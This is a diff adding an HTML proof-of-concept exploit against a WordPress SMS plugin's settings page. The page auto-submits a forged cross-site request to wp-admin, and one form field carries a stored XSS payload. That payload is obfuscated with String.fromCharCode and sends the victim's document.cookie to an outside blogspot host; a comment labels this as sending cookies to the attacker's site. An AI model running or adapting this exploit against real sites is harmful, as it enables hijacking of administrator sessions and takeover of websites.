@@ -1,0 +1,39 @@
+&lt;html&gt;
+&lt;head&gt;
+&lt;script type=&quot;text/javascript&quot; language=&quot;javascript&quot;&gt;
+function submitform()
+{
+    document.getElementById(&#039;myForm&#039;).submit();
+}
+&lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;form name=&quot;myForm&quot; action=&quot;http://127.0.0.1/wordpress-3.5.1/wordpress/wp-admin/admin.php?page=sms&quot; method=&quot;post&quot;&gt;
+ 
+&lt;textarea name=&quot;wpsms_api1&quot; id=&quot;wpsms_api1&quot; class=&quot;regular-text&quot; cols=&quot;100&quot; rows=&quot;5&quot;&gt;http://blackpentesters.blogspot.com/smsapi.php?username=yourusername&amp;password=yourpassword&amp;mobile=[Mobile]&amp;sms=[TextMessage]&amp;senderid=[SenderID]&amp;lt;/textarea&amp;gt;
+ 
+&lt;input type=&quot;text&quot; name=&quot;sender_id&quot; id=&quot;sender_id&quot; value=&quot;eXpl0i13r&quot;&gt;
+&lt;input type=&quot;checkbox&quot; name=&quot;remove_bad_words&quot; id=&quot;remove_bad_words&quot; checked=&quot;checked&quot; value=&quot;1&quot;&gt;
+ 
+# Below Field Contains XSS Payload for sending Cookies to attacker website :
+# In my case this will redirect you to http://blackpentesters.blogspot.com+cookies
+ 
+&lt;input type=&quot;text&quot; name=&quot;maximum_characters&quot; class=&quot;maximum_characters&quot; id=&quot;maximum_characters&quot; value=&quot;&quot;&gt;&lt;script&gt;location=String.fromCharCode(104)+String.fromCharCode(116)+String.fromCharCode(116)+String.fromCharCode(112)+String.fromCharCode(58)+String.fromCharCode(47)+String.fromCharCode(47)+String.fromCharCode(98)+String.fromCharCode(108)+String.fromCharCode(97)+String.fromCharCode(99)+String.fromCharCode(107)+String.fromCharCode(112)+String.fromCharCode(101)+String.fromCharCode(110)+String.fromCharCode(116)+String.fromCharCode(101)+String.fromCharCode(115)+String.fromCharCode(116)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(115)+String.fromCharCode(46)+String.fromCharCode(98)+String.fromCharCode(108)+String.fromCharCode(111)+String.fromCharCode(103)+String.fromCharCode(115)+String.fromCharCode(112)+String.fromCharCode(111)+String.fromCharCode(116)+String.fromCharCode(46)+String.fromCharCode(99)+String.fromCharCode(111)+String.fromCharCode(109)+String.fromCharCode(47)+String.fromCharCode(63)+document.cookie&lt;/script&gt;&quot;&gt;
+ 
+&lt;input type=&quot;checkbox&quot; name=&quot;captcha&quot; id=&quot;captcha&quot; checked=&quot;checked&quot; value=&quot;1&quot;&gt; 
+&lt;input type=&quot;text&quot; name=&quot;captcha_width&quot; class=&quot;captcha_option_input&quot; value=&quot;&quot; id=&quot;acpro_inp4&quot;&gt;
+&lt;input type=&quot;text&quot; name=&quot;captcha_height&quot; class=&quot;captcha_option_input&quot; value=&quot;&quot; id=&quot;acpro_inp5&quot;&gt;
+&lt;input type=&quot;text&quot; name=&quot;captcha_characters&quot; class=&quot;captcha_option_input&quot; value=&quot;4&quot; id=&quot;acpro_inp6&quot;&gt;
+&lt;input type=&quot;checkbox&quot; name=&quot;confirm_page&quot; id=&quot;confirm_page&quot; checked=&quot;checked&quot; value=&quot;1&quot;&gt;
+&lt;input type=&quot;checkbox&quot; name=&quot;allow_without_login&quot; id=&quot;allow_without_login&quot; checked=&quot;checked&quot; value=&quot;1&quot;&gt;
+&lt;input type=&quot;checkbox&quot; name=&quot;custom_response&quot; id=&quot;custom_response&quot; value=&quot;1&quot;&gt;
+&lt;textarea name=&quot;custom_response_text&quot; cols=&quot;100&quot; rows=&quot;5&quot;&gt;&amp;lt;/textarea&amp;gt;
+&lt;input type=&quot;hidden&quot; name=&quot;settings_submit&quot; value=&quot;true&quot;&gt;
+&lt;input type=&quot;submit&quot; value=&quot;Update Settings&quot; class=&quot;button-primary&quot;&gt;
+&lt;/form&gt;
+ 
+&lt;script type=&quot;text/javascript&quot; language=&quot;javascript&quot;&gt;
+document.myForm.submit()
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
